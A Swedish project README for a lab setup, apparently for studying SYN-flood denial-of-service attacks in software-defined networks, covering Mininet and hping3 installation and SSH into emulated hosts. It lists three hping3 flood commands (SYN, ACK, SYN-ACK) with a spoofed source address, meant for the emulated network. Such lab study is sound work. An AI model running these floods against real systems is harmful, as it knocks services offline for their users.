# SYN-FLOOD-DOS-ATTACKER-I-SDN
Den här samlingen av dokument innehåller en guide till hur Mininet och Hping3 installeras. Dokumentationen innehåller även attack-kommandon och SSH.

## Installation av Mininet i UBUNTU

Börja med att installera Mininet med följande kommando `sudo apt-get install mininet`.

Installera git kommandot `sudo apt-get install git`.

För att installera Mininet från källkoden behöver du installera källkoden `git clone git://github.com/mininet/mininet`.

I Mininet hitta `git tag` och sedan Kopiera tag.

Skapa en ny gren med tagen du kopierade `git checkout -b "tag"`.

Ladda ned verktyg för Mininet `mininet/util/install.sh -a`.

Lägg till din linux distribution, den finns på toppen när du laddar ned `mininet/util/install.sh -a "din linux distribution"`.

## Starta Mininet

För att starta en simpel Mininet topologi skriver du `sudo mn` det skapar en Mininet topologi med en kontroller, switch och två host. Använd våra Python skript för att skapa våra topologier.

## stäng Mininet

Stäng mininet genom `sudo mn -c`

## Installation av hping3

Ladda ned Hping3 med `sudo apt-get install hping3`

## Hping3 attack-kommandon

SYN-flood attack `hping3 "target ip-address" --syn --flood -a 10.0.0.13`.

ACK-flood attack `hping3 "target ip-address" --ack --flood -a 10.0.0.13`

SYN-ACK-flood attack `hping3 "target ip-address" --syn --ack --flood -a 10.0.0.13`

## SSH daemon
För att kunna köra ssh till Mininet skriver du `sudo ~/mininet/examples/sshd.py`.

Nu kan du ssh från en annan terminal till en host `ssh "host IP-adress"`